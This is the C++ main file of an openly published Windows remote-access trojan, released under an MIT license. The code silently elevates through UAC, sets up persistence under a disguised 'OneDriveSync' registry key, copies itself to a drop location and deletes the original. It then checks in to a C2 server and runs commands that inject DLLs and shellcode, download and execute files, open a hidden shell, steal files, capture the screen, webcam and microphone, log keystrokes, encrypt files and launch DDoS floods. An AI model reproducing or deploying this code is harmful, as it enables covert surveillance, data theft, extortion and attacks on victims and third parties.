/*
MIT License

Copyright (c) 2020 4B4DB4B3

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/
#pragma warning(disable: 4996)
#include "common.h"
#include "Manager.h"
#include "C2Client.h"
#include "Telemetry.h"

#include "ProcessManager.h"
#include "FileManager.h"
#include "ServiceManager.h"
#include "ScreenTool.h"
#include "Information.h"
#include "BotNet.h"
#include "Protector.h"
#include "FileCryptor.h"
#include "Keylogger.h"
#include "WebcamTool.h"
#include "MicTool.h"

// Returns true if this process token is elevated (admin)
static bool IsElevated() {
	BOOL elevated = FALSE;
	HANDLE hToken = NULL;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		TOKEN_ELEVATION te = {};
		DWORD sz = sizeof(te);
		if (GetTokenInformation(hToken, TokenElevation, &te, sz, &sz))
			elevated = te.TokenIsElevated;
		CloseHandle(hToken);
	}
	return elevated != FALSE;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, INT) {
	// Auto-elevate: if not running as admin, re-launch via "runas" (triggers UAC once)
	// Children launched by this elevated process via ShellExecuteA("open") inherit
	// the elevated token automatically — no second UAC prompt.
	if (!IsElevated()) {
		char me[MAX_PATH] = {};
		GetModuleFileNameA(NULL, me, MAX_PATH - 1);
		std::string verb = S("runas");
		SHELLEXECUTEINFOA sei = {};
		sei.cbSize       = sizeof(sei);
		sei.lpVerb       = verb.c_str();
		sei.lpFile       = me;
		sei.lpParameters = (lpCmdLine && *lpCmdLine) ? lpCmdLine : NULL;
		sei.nShow        = SW_HIDE;
		ShellExecuteExA(&sei);
		return 0;
	}

	srand((unsigned int)time(NULL));
	Manager::Settings s;
	Manager::ReadData(&s);

	char me[128] = { 0 };
	GetModuleFileNameA(0, me, sizeof(me) - 1);

	HKEY hKey = 0;
	std::string addrStr = S("Software\\Microsoft\\OneDriveSync");
	const char* addr = addrStr.c_str();
	LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, addr, 0, KEY_READ, &hKey);

	if (result != ERROR_SUCCESS) {
		RegCreateKeyA(HKEY_CURRENT_USER, addr, &hKey);

		if (s.autorun_state) {
			if (s.drop_run) {
				Manager::Autorun(s.drop, s.autorun);
			}
			else {
				Manager::Autorun(me, s.autorun);
			}
		}

		if (s.scheduler_state) {
			if (s.drop_run) {
				Manager::Scheduler(s.drop, s.scheduler_name);
			}
			else {
				Manager::Scheduler(me, s.scheduler_name);
			}
		}

		if (s.drop_run) {
			if (std::string(me) != s.drop) {
				CopyFileA(me, s.drop, false);
				ShellExecuteA(0, "open", s.drop, 0, 0, SW_HIDE);

				if (s.auto_delete) {
					std::ofstream bat(BAT_AUTODEL);
					bat << "@echo off\n";
					bat << "del " + std::string(me);
					bat << "\ndel " BAT_AUTODEL;
					bat.close();

					ShellExecuteA(0, "open", BAT_AUTODEL, 0, 0, SW_HIDE);
				}

				return 0;
			}
		}
		else {
			ShellExecuteA(0, "open", me, 0, 0, SW_HIDE);
		}

		RegCloseKey(hKey);
	}
	else {
		RegCloseKey(hKey);

		// lpCmdLine is args-only (no exe path), so spaces in the install path don't cause false splits
		std::vector<std::string> spLine;
		if (lpCmdLine && lpCmdLine[0])
			spLine = Manager::split(lpCmdLine, ' ');

		if (spLine.size() >= 2) {
			// Protector watcher mode: arg0=procName, arg1=procPath
			Protector::_SpyProcess SP;
			SP.procName = (char*)spLine[0].c_str();
			SP.procPath = (char*)spLine[1].c_str();

			CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Protector::SpyProcess, (LPVOID)&SP, 0, 0);
			while (true) {
				Sleep(1000);
			}
		}
		else {
			bool isProtected = (!spLine.empty() && spLine[0] == "protected");
			if (!isProtected) {
				char procName[128], procPath[128];

				GetModuleBaseNameA(GetCurrentProcess(), 0, procName, sizeof(procName));
				GetModuleFileNameA(0, procPath, sizeof(procPath));
				strcat(procName, ".exe");

				CopyFileA(procPath, s.protectorName, FALSE);

				std::string arg = std::string(procName) + " " + procPath;
				ShellExecuteA(0, "open", s.protectorName, arg.c_str(), 0, SW_HIDE);
			}

			if (s.botapi[0] == '\0') {
				ExitProcess(0);
			}

			// Persist bot ID in registry so restarts don't create duplicate bots
			int ID = 0;
			HKEY hIdKey = 0;
			if (RegOpenKeyExA(HKEY_CURRENT_USER, addr, 0, KEY_READ | KEY_WRITE, &hIdKey) == ERROR_SUCCESS) {
				DWORD sz = sizeof(ID);
				std::string botIdKey = S("BotID");
				if (RegQueryValueExA(hIdKey, botIdKey.c_str(), 0, NULL, (LPBYTE)&ID, &sz) != ERROR_SUCCESS || ID == 0) {
					ID = rand();
					RegSetValueExA(hIdKey, botIdKey.c_str(), 0, REG_DWORD, (LPBYTE)&ID, sizeof(ID));
				}
				RegCloseKey(hIdKey);
			} else {
				ID = rand();
			}
			// s.botapi = C2 server hostname, s.chatid = auth key
			C2Client api(s.botapi, s.chatid, ID);
			BotNet botnet;

			SYSTEM_INFO SysInfo;
			GetSystemInfo(&SysInfo);

			if (s.protector) {
				CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Protector::AntiProcesses, 0, 0, 0);
			}

			std::string information = "Bot ID: " + std::to_string(ID) +
				"%0A%0AGlobal information:" +
				"%0AName: " + Information::GetPCName() +
				"%0AIP: " + Information::GetIP() +
				"%0AOS: " + Information::GetOS() +
				"%0A%0AHardware information:" +
				"%0AOEM ID: " + std::to_string(SysInfo.dwOemId) +
				"%0AProcessors: " + std::to_string(SysInfo.dwNumberOfProcessors) +
				"%0AProcessor: " + Information::GetProcessorBrand();

			api.Checkin(information.c_str());

			Telemetry::Start(&api, ID);

			std::string last;
			std::vector<std::string> params;

			while (true) {
				Sleep(atoi(s.client_delay));

				last = api.GetPendingCommand();

				if (last.empty()) {
					continue;
				}

				params = Manager::split(last, ' ');

				// PROCESS MANAGER
				if (last == "processes") {
					std::string processes = ProcessManager::ProcessList();
					api.SendResult(processes.empty() ? "Error! Processes is empty" : processes.c_str());
				}

				// closeproc process.exe
				else if (params[0] == "closeproc") {
					api.SendResult(ProcessManager::CloseProcess(params[1])
						? "Success! Process has been closed"
						: "Error! Process isn't closed");
				}

				// inject_dll process.exe C:\path\to.dll
				else if (params[0] == "inject_dll") {
					api.SendResult(ProcessManager::InjectDLL(params[1].c_str(), params[2].c_str())
						? "Success! DLL has been injected"
						: "Error! DLL isn't injected");
				}

				// inject_shell process.exe <shellcode>
				else if (params[0] == "inject_shell") {
					DWORD pid = ProcessManager::PIDByName(params[1]);
					if (pid != 0) {
						api.SendResult(ProcessManager::InjectShell(pid, params[2])
							? "Success! Shellcode is injected"
							: "Error! Shellcode isn't injected");
					}
					else {
						api.SendResult("Error! Process not found");
					}
				}

				// AUXILIARY
				// loader https://example.com/file.exe C:\dest\file.exe
				else if (params[0] == "loader") {
					URLDownloadToFileA(0, params[1].c_str(), params[2].c_str(), 0, 0);
					if (Manager::FileExists(params[2])) {
						std::string text = "Success! File is uploaded to: " + params[2];
						api.SendResult(text.c_str());
					}
					else {
						api.SendResult("Error! File not uploaded!");
					}
				}

				// run C:\File.exe [args]
				else if (params[0] == "run") {
					if (params.size() >= 3) {
						ShellExecuteA(0, "open", params[1].c_str(), params[2].c_str(), 0, 0);
						api.SendResult("Success! Ran with arguments");
					}
					else {
						ShellExecuteA(0, "open", params[1].c_str(), 0, 0, 0);
						api.SendResult("Success! Ran without arguments");
					}
				}

				// SYSTEM CONTROL
				else if (last == "disable pc") {
					// Adjust shutdown privilege then call ExitWindowsEx — no cmd.exe subprocess
					HANDLE hTok = NULL;
					if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTok)) {
						TOKEN_PRIVILEGES tp = {};
						tp.PrivilegeCount = 1;
						std::string priv = S("SeShutdownPrivilege");
						LookupPrivilegeValueA(NULL, priv.c_str(), &tp.Privileges[0].Luid);
						tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
						AdjustTokenPrivileges(hTok, FALSE, &tp, sizeof(tp), NULL, NULL);
						CloseHandle(hTok);
					}
					ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE, 0);
				}

				else if (last == "close") {
					ExitProcess(0);
				}

				else if (last == "disable display") {
					SendMessage(NULL, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
				}

				// FILE MANAGER
				// dir del_file C:\path\to\file.exe
				// dir show C:\Folder
				// dir read C:\path\to\file.txt
				// dir write C:\path\to\file.txt text...
				else if (params[0] == "dir") {
					if (params[1] == "del_file") {
						api.SendResult(DeleteFileA(params[2].c_str())
							? "Success! File deleted"
							: "Error! File was not deleted");
					}
					else if (params[1] == "show") {
						std::string objects = FileManager::DirectoryObjectsList(params[2]);
						api.SendResult(objects.empty() ? "Error! Files not found!" : objects.c_str());
					}
					else if (params[1] == "read") {
						std::string text = FileManager::ReadFile(params[2]);
						api.SendResult(text.empty() ? "Error! File was not read" : text.c_str());
					}
					else if (params[1] == "write") {
						std::string write_text = last;
						write_text.replace(0, last.find(params[2]) + params[2].length() + 1, "");
						api.SendResult(FileManager::WriteFile(params[2], write_text)
							? "Success! Text is written"
							: "Error! Text was not written");
					}
				}

				// PULL FILE  —  pull C:\path\to\file
				else if (params[0] == "pull") {
					std::string filePath = last.substr(5); // strip "pull "
					std::string saved = api.UploadFile(filePath.c_str());
					api.SendResult(saved.empty() ? "Error! File upload failed" : ("Uploaded: " + saved).c_str());
				}

				// SERVICE MANAGER
				else if (params[0] == "service") {
					if (params[1] == "show") {
						std::string services = ServiceManager::ServiceList();
						api.SendResult(services.empty() ? "Error! Services is empty" : services.c_str());
					}
					else if (params[1] == "add") {
						DWORD Type      = ServiceManager::ParseTypeDriver(params[5]);
						DWORD StartType = ServiceManager::ParseStartTypeDriver(params[6]);
						if (Type == 0 || StartType == 0) {
							api.SendResult("Error! Invalid service type or start type");
						}
						else {
							api.SendResult(ServiceManager::AddSvc(params[2], params[3], params[4], Type, StartType)
								? "Success! Service has been added"
								: "Error! Service not added");
						}
					}
					else if (params[1] == "delete") {
						api.SendResult(ServiceManager::DeleteSvc(params[2])
							? "Success! Service has been deleted"
							: "Error! Service not deleted");
					}
					else if (params[1] == "start") {
						api.SendResult(ServiceManager::StartSvc(params[2])
							? "Success! Service has been started"
							: "Error! Service not started");
					}
					else if (params[1] == "stop") {
						api.SendResult(ServiceManager::StopSvc(params[2])
							? "Success! Service has been stopped"
							: "Error! Service not stopped");
					}
				}

				// SYSTEM SHELL
				// system ping google.com
				else if (params[0] == "system") {
					try {
						std::string cmd = last;
						cmd.replace(cmd.find("system "), 7, "");
						char windir[128] = { 0 };
						if (GetWindowsDirectoryA(windir, sizeof(windir) - 1) != 0) {
							ShellExecuteA(NULL, "open",
								std::string(std::string(windir) + "\\System32\\cmd.exe").c_str(),
								cmd.c_str(), 0, SW_HIDE);
							api.SendResult("Success! Command is running");
						}
						else {
							api.SendResult("Error! Windows directory is null");
						}
					}
					catch (std::exception) {
						api.SendResult("Error! Recheck the parameters");
					}
				}

				// SCREENSHOT
				else if (params[0] == "screenshot") {
					std::string filename = std::to_string(rand()) + ".jpeg";
					if (ScreenTool::GDIScreen(filename)) {
						std::string saved = api.UploadFile(filename.c_str());
						DeleteFileA(filename.c_str());
						if (!saved.empty()) {
							std::string msg = "Screenshot saved on C2: " + saved;
							api.SendResult(msg.c_str());
						} else {
							api.SendResult("Error! Screenshot upload failed");
						}
					}
					else {
						api.SendResult("Error! Screenshot was not created");
					}
				}

				// FILE CRYPTOR
				// filecrypt C:\path\to\file.txt <key>
				else if (params[0] == "filecrypt") {
					api.SendResult(FileCryptor::FileCrypt(params[1], params[2])
						? "Success! File crypted"
						: "Error! File not crypted. Maybe file not found?");
				}

				// filedecrypt C:\path\to\file.txt.b4db4b3 <key>
				else if (params[0] == "filedecrypt") {
					api.SendResult(FileCryptor::FileDecrypt(params[1], params[2])
						? "Success! File decrypted"
						: "Error! File not decrypted");
				}

				// WEBCAM
				// webcam capture
				else if (params[0] == "webcam") {
					if (params.size() >= 2 && params[1] == "capture") {
						std::string fname = std::to_string(rand()) + "_webcam.jpeg";
						if (WebcamTool::CaptureFrame(fname)) {
							std::string saved = api.UploadFile(fname.c_str());
							DeleteFileA(fname.c_str());
							api.SendResult(saved.empty()
								? "Error! Webcam capture failed to upload"
								: ("Webcam frame saved on C2: " + saved).c_str());
						} else {
							api.SendResult("Error! Webcam not available or capture failed");
						}
					} else {
						api.SendResult("Usage: webcam capture");
					}
				}

				// MICROPHONE
				// mic record <seconds>
				else if (params[0] == "mic") {
					if (params.size() >= 3 && params[1] == "record") {
						int secs = atoi(params[2].c_str());
						if (secs < 1 || secs > 60) secs = 10;
						std::string fname = std::to_string(rand()) + "_mic.wav";
						if (MicTool::Record(fname, secs)) {
							std::string saved = api.UploadFile(fname.c_str());
							DeleteFileA(fname.c_str());
							api.SendResult(saved.empty()
								? "Error! Mic recording failed to upload"
								: ("Mic recording saved on C2: " + saved).c_str());
						} else {
							api.SendResult("Error! Microphone not available or recording failed");
						}
					} else {
						api.SendResult("Usage: mic record <seconds>  (1-60)");
					}
				}

				// KEYLOGGER
				// keylog start
				// keylog stop
				// keylog dump
				// keylog status
				else if (params[0] == "keylog") {
					if (params.size() >= 2) {
						if (params[1] == "start") {
							Keylogger::Start();
							api.SendResult("Keylogger started");
						}
						else if (params[1] == "stop") {
							Keylogger::Stop();
							api.SendResult("Keylogger stopped");
						}
						else if (params[1] == "dump") {
							std::string data = Keylogger::Dump();
							api.SendResult(data.empty() ? "Buffer empty" : data.c_str());
						}
						else if (params[1] == "status") {
							api.SendResult(Keylogger::IsRunning() ? "Keylogger: RUNNING" : "Keylogger: STOPPED");
						}
						else {
							api.SendResult("Usage: keylog start|stop|dump|status");
						}
					}
					else {
						api.SendResult(Keylogger::IsRunning() ? "Keylogger: RUNNING" : "Keylogger: STOPPED");
					}
				}

				// BOTNET DDoS
				// botnet start https://target.com
				// botnet stop
				else if (params[0] == "botnet") {
					if (params[1] == "start" && params.size() >= 3) {
						botnet.Start((char*)params[2].c_str());
						api.SendResult("Started BotNet flood");
					}
					else if (params[1] == "stop") {
						botnet.Stop();
						api.SendResult("Stopped BotNet flood");
					}
				}
			}
		}
	}

	return 0;
}
